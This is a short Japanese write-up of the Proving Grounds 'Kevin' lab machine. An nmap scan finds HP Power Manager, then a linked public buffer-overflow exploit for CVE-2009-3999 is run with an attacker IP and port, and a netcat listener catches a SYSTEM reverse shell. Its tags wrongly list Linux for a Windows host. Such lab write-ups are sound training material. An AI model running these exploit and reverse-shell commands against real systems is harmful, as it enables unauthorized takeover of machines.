+++
title = "Proving Grounds Practice - Kevin Writeup"
date = "2026-10-07"
description = "HP Power Managerのエクスプロイトを使用しリバースシェルを実行"
tags = ["Proving Grounds Practice", "CTF", "[Linux]","[HP Power Manager]", "[easy]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Kevin |
| OS | Windows |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV -sC 192.168.116.45    
```

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-09 21:38 +0900
Nmap scan report for 192.168.116.45
Host is up (0.10s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         GoAhead WebServer
| http-title: HP Power Manager
|_Requested resource was http://192.168.116.45/index.asp
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-date: 2026-10-09T12:39:47+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=kevin
| Not valid before: 2026-10-08T12:36:47
|_Not valid after:  2027-04-09T12:36:47
| rdp-ntlm-info: 
|   Target_Name: KEVIN
|   NetBIOS_Domain_Name: KEVIN
|   NetBIOS_Computer_Name: KEVIN
|   DNS_Domain_Name: kevin
|   DNS_Computer_Name: kevin
|   Product_Version: 6.1.7600
|_  System_Time: 2026-10-09T12:39:32+00:00
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m02s, deviation: 3h07m49s, median: 2s
| smb-os-discovery: 
|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::-
|   Computer name: kevin
|   NetBIOS computer name: KEVIN\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-10-09T05:39:32-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-10-09T12:39:32
|_  start_date: 2026-10-09T12:37:31
|_nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:47:6e (VMware)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.22 seconds

```

---

## exploit
https://github.com/AC8999/CVE-2009-3999-HP-Power-Manager-4.2-Build-7-Buffer-Overflow/blob/main/CVE-2009-3999.py
```bash
python3 b.py 192.168.116.45 80 IP 4444   
```


```bash
nc -lvnp 4444 
```

```text
C:\Windows\system32>whoami
whoami
nt authority\system
```


## Summary

nmap <  HP Power Managerのexploit検索 < リバースシェル
